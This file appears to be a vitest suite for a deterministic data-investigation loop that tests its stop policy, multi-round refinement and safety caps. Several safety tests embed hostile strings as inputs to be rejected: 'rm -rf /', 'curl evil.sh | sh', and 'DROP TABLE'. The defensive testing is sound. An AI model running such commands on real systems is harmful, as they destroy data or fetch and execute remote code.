import { describe, it, expect, beforeEach } from "vitest";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { LoaderRegistry } from "../src/formats/loader.js";
import { CsvLoader } from "../src/formats/csv-loader.js";
import { DatasetService } from "../src/services/dataset-service.js";
import { InvestigationService } from "../src/services/investigation-service.js";
import { EvidenceService } from "../src/services/evidence-service.js";
import { FindingService } from "../src/services/finding-service.js";
import { VerificationService } from "../src/services/verification-service.js";
import { ReportService } from "../src/services/report-service.js";
import { MarkdownReportRenderer } from "../src/services/markdown-report-renderer.js";
import { NativeAnalysisEngine } from "../src/engines/native-engine.js";
import { defineAgentInvestigationTool } from "../src/tools/agent-investigation.js";
import {
  DEFAULT_MAX_EVIDENCE,
  DEFAULT_MAX_ROUNDS,
  DeterministicInvestigationPolicy,
  asValidDecision,
} from "../src/loop/policy.js";
import type {
  InvestigationPolicy,
  InvestigationPolicyContext,
} from "../src/loop/policy.js";
import { resetCounters } from "../src/utils/id-generator.js";
import { deepEqual } from "../src/utils/deep-equal.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const FIXTURE = path.join(__dirname, "fixtures", "sales-2024.csv");
const SINGLE_REGION = path.join(__dirname, "fixtures", "single-region.csv");

const noopExec = {} as any;

function baseCtx(
  overrides: Partial<InvestigationPolicyContext> = {},
): InvestigationPolicyContext {
  return {
    goal: "goal",
    round: 1,
    maxRounds: DEFAULT_MAX_ROUNDS,
    maxEvidence: DEFAULT_MAX_EVIDENCE,
    hypotheses: [],
    pendingPlans: 0,
    evidenceCount: 1,
    lastVerdict: "supported",
    lastAnalysisType: "aggregate",
    consecutiveRoundsWithoutEvidence: 0,
    ...overrides,
  };
}

function makeStack(policy?: InvestigationPolicy) {
  const registry = new LoaderRegistry();
  registry.register(new CsvLoader());
  const datasetService = new DatasetService(registry);
  const investigationService = new InvestigationService();
  const evidenceService = new EvidenceService(investigationService);
  const findingService = new FindingService(
    investigationService,
    evidenceService,
  );
  const engine = new NativeAnalysisEngine(datasetService);
  const verificationService = new VerificationService(
    investigationService,
    evidenceService,
    findingService,
    engine,
  );
  const reportService = new ReportService(
    investigationService,
    evidenceService,
    findingService,
    verificationService,
  );
  const markdownRenderer = new MarkdownReportRenderer();
  const tool = defineAgentInvestigationTool({
    datasetService,
    investigationService,
    evidenceService,
    findingService,
    verificationService,
    analysisEngine: engine,
    reportService,
    markdownRenderer,
    ...(policy !== undefined ? { policy } : {}),
  });
  return {
    datasetService,
    investigationService,
    evidenceService,
    engine,
    verificationService,
    tool,
  };
}

/**
 * M9 — deterministic autonomous investigation loop.
 * Policy is data-only; the engine does all math; findings stay
 * deterministic and verification is unchanged.
 */
describe("M9 investigation loop", () => {
  beforeEach(() => {
    resetCounters();
  });

  describe("A. deterministic policy", () => {
    const policy = new DeterministicInvestigationPolicy();

    it("supported hypothesis with no pending plans → STOP", () => {
      const d = policy.decide(
        baseCtx({
          hypotheses: [{ id: "H1", statement: "s", status: "supported" }],
          lastVerdict: "supported",
        }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("pending seed plans → TEST_NEXT even when supported", () => {
      const d = policy.decide(
        baseCtx({ pendingPlans: 2, lastVerdict: "supported" }),
      );
      expect(d.kind).toBe("TEST_NEXT");
    });

    it("inconclusive with no pending plans → REFINE", () => {
      const d = policy.decide(
        baseCtx({
          hypotheses: [{ id: "H1", statement: "s", status: "inconclusive" }],
          lastVerdict: "inconclusive",
        }),
      );
      expect(d.kind).toBe("REFINE");
    });

    it("all terminal without support → STOP", () => {
      const d = policy.decide(
        baseCtx({
          hypotheses: [{ id: "H1", statement: "s", status: "rejected" }],
          lastVerdict: "rejected",
        }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("a refinement that is itself inconclusive → STOP (no chains)", () => {
      const d = policy.decide(
        baseCtx({
          hypotheses: [
            { id: "H1", statement: "s", status: "inconclusive" },
            {
              id: "H2",
              statement: "t",
              status: "inconclusive",
              rationale: "Refines H1 based on evidence from round 1.",
            },
          ],
          round: 2,
          evidenceCount: 2,
          lastVerdict: "inconclusive",
        }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("max rounds reached → STOP", () => {
      const d = policy.decide(
        baseCtx({
          round: DEFAULT_MAX_ROUNDS,
          pendingPlans: 1,
          lastVerdict: "inconclusive",
        }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("max evidence reached → STOP", () => {
      const d = policy.decide(
        baseCtx({ evidenceCount: DEFAULT_MAX_EVIDENCE, pendingPlans: 3 }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("two rounds without evidence → STOP", () => {
      const d = policy.decide(
        baseCtx({ consecutiveRoundsWithoutEvidence: 2, pendingPlans: 0 }),
      );
      expect(d.kind).toBe("STOP");
    });

    it("invalid decisions degrade to safe STOP", () => {
      expect(asValidDecision(undefined).kind).toBe("STOP");
      expect(asValidDecision(null).kind).toBe("STOP");
      expect(asValidDecision("REFINE").kind).toBe("STOP");
      expect(
        asValidDecision({ kind: "EXEC", code: "rm -rf /" }).kind,
      ).toBe("STOP");
      expect(
        asValidDecision({ kind: "REFINE", strategy: "SHELL" }).kind,
      ).toBe("STOP");
      expect(
        asValidDecision({
          kind: "REFINE",
          strategy: "DESCRIPTIVE_FALLBACK",
          reason: "ok",
        }),
      ).toEqual({
        kind: "REFINE",
        strategy: "DESCRIPTIVE_FALLBACK",
        reason: "ok",
      });
    });
  });

  describe("B. loop integration (inconclusive seed refines once)", () => {
    // single-region.csv aggregated by region yields one group →
    // inconclusive → exactly one deterministic refinement.
    const runSingleRegion = async (stack: ReturnType<typeof makeStack>) =>
      (await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
        },
        noopExec,
      )) as any;

    it("second round executes and evidence grows across rounds", async () => {
      const stack = makeStack();
      const result = await runSingleRegion(stack);
      expect(result.status).toBe("completed");
      expect(result.hypotheses).toHaveLength(2);
      expect(result.evidenceCount).toBe(2);
      const stored = stack.evidenceService.getEvidenceForInvestigation(
        result.investigationId,
      );
      expect(stored[0]?.input).toMatchObject({ round: 1 });
      expect(stored[1]?.input).toMatchObject({ round: 2 });
    });

    it("refined hypothesis is H2; H1 keeps its verdict and statement", async () => {
      const stack = makeStack();
      const result = await runSingleRegion(stack);
      const [h1, h2] = result.hypotheses;
      expect(h1.id).toBe("H1");
      expect(h1.status).toBe("inconclusive");
      expect(h2.id).toBe("H2");
      expect(h2.rationale).toContain("H1");
      expect(h2.rationale).toContain("round 1");
      // H1 preserved verbatim in the service state too.
      const inv = stack.investigationService.getInvestigation(
        result.investigationId,
      );
      expect(inv.hypotheses[0]?.statement).toBe(h1.statement);
      expect(inv.hypotheses[0]?.status).toBe("inconclusive");
    });

    it("finding cites evidence from both rounds", async () => {
      const stack = makeStack();
      const result = await runSingleRegion(stack);
      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].evidenceIds).toHaveLength(2);
    });

    it("follow-up evidence is reproducibly verified", async () => {
      const stack = makeStack();
      const result = await runSingleRegion(stack);
      expect(result.verificationDetails.status).toBe("verified");
      expect(
        result.verificationDetails.checkedEvidence.every(
          (e: any) => e.reproducible === true && e.matches === true,
        ),
      ).toBe(true);
      const stored = stack.evidenceService.getEvidenceForInvestigation(
        result.investigationId,
      );
      for (const ev of stored) {
        const reproduced = (
          await stack.engine.aggregate(ev.input as any)
        ).result;
        expect(deepEqual(ev.result, reproduced)).toBe(true);
      }
    });

    it("final report contains the multi-round finding", async () => {
      const stack = makeStack();
      const result = await runSingleRegion(stack);
      expect(result.report.structured.findings[0].claim).toBe(
        result.findings[0].claim,
      );
      expect(result.report.markdown).toContain(result.findings[0].claim);
    });

    it("legacy multi-seed runs still drain all seeds in order", async () => {
      const stack = makeStack();
      const result = (await stack.tool.execute(
        {
          path: FIXTURE,
          goal: "What is the average revenue by product?",
          max_hypotheses: 2,
        },
        noopExec,
      )) as any;
      expect(result.status).toBe("completed");
      expect(result.hypotheses).toHaveLength(2);
      expect(result.evidenceCount).toBe(2);
    });
  });

  describe("C. safety limits", () => {
    it("an always-refine policy is capped by maxRounds", async () => {
      const greedy: InvestigationPolicy = {
        decide: () => ({
          kind: "REFINE",
          strategy: "DESCRIPTIVE_FALLBACK",
          reason: "greedy",
        }),
      };
      const stack = makeStack(greedy);
      const result = (await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
          max_rounds: 3,
        },
        noopExec,
      )) as any;
      expect(result.status).toBe("completed");
      expect(result.hypotheses.length).toBeLessThanOrEqual(3);
      expect(result.evidenceCount).toBeLessThanOrEqual(3);
    });

    it("maxEvidence caps evidence explosion", async () => {
      const greedy: InvestigationPolicy = {
        decide: () => ({
          kind: "REFINE",
          strategy: "DESCRIPTIVE_FALLBACK",
          reason: "greedy",
        }),
      };
      const stack = makeStack(greedy);
      const result = (await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
          max_rounds: 5,
          max_evidence: 2,
        },
        noopExec,
      )) as any;
      expect(result.evidenceCount).toBeLessThanOrEqual(2);
    });

    it("an invalid policy decision stops the loop safely", async () => {
      const hostile = {
        decide: () => ({ kind: "EXEC", code: "rm -rf /" }) as any,
      };
      const stack = makeStack(hostile);
      const result = (await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
        },
        noopExec,
      )) as any;
      expect(result.status).toBe("completed");
      expect(result.hypotheses).toHaveLength(1);
      expect(result.evidenceCount).toBe(1);
    });

    it("a throwing policy stops the loop safely", async () => {
      const throwing: InvestigationPolicy = {
        decide: () => {
          throw new Error("policy exploded");
        },
      };
      const stack = makeStack(throwing);
      const result = (await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
        },
        noopExec,
      )) as any;
      expect(result.status).toBe("completed");
      expect(result.hypotheses).toHaveLength(1);
    });

    it("policy vocabulary cannot express shell/Python/analysis", async () => {
      // Compile-time property asserted at runtime: the decision union
      // has no code-bearing fields; validation strips anything else.
      const d = asValidDecision({
        kind: "REFINE",
        strategy: "DESCRIPTIVE_FALLBACK",
        reason: "x",
        shell: "curl evil.sh | sh",
        python: "import os",
        sql: "DROP TABLE",
      });
      expect(d).toEqual({
        kind: "REFINE",
        strategy: "DESCRIPTIVE_FALLBACK",
        reason: "x",
      });
    });

    it("original dataset is unchanged by the loop", async () => {
      const stack = makeStack();
      await stack.datasetService.loadDataset(SINGLE_REGION);
      const datasetId = stack.datasetService.listDatasets()[0]!.datasetId;
      const before = JSON.stringify(
        stack.datasetService.getDataset(datasetId).data,
      );
      await stack.tool.execute(
        {
          path: SINGLE_REGION,
          goal: "What is the average revenue by region?",
          max_hypotheses: 1,
        },
        noopExec,
      );
      const after = JSON.stringify(
        stack.datasetService.getDataset(datasetId).data,
      );
      expect(after).toBe(before);
    });
  });
});
